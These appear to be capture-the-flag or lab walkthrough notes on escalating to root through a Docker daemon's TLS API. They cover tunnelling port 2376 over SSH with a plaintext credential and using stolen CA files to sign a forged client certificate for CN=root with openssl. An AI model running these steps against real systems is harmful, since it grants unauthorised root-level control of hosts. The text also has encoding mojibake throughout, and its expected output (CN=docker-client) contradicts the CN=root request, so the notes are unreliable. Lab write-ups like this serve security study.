## **TLS Certificates**

### Using CA from `certs/`

From the previous step you can create a self-signed certificate as *root* user to access via *SSH*, using the files you have copied to your machine.

### Creating a tunnel

#Attacking_machine 
- Tunnel port **2376**. Credentials: `svc::Friesf00Ds2025!!`

```
ssh svc@<IP> -L 2376:127.0.0.1:2376
```

![[cert_ssh.png]]

### Generating a root certificate

Generate **rootâ€‘signed cert** â†’ full Docker API access.

ğŸ” **1. Generate the client private key**
```
openssl genrsa -out key.pem 2048
```
This becomes your Docker clientâ€™s private key.

ğŸ“ **2. Create a CSR (Certificate Signing Request)**
![](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)

```
openssl req -new \
  -key key.pem \
  -out client.csr \
  -subj "/CN=root"
```

ğŸ·ï¸ **3. Sign the client certificate using the daemonâ€™s CA**

This is the critical step:

```
openssl x509 -req \
  -in client.csr \
  -CA ca.pem \
  -CAkey ca-key.pem \
  -CAcreateserial \
  -out cert.pem \
  -days 365 \
  -sha256
```

If the CA files are correct, youâ€™ll see: 
Signature ok
subject=CN=docker-client

And no errors.

ğŸ” **4. Verify the certificate chain**

Check subject + issuer:
```
openssl x509 -in cert.pem -noout -text | grep -E "Issuer|Subject"
```
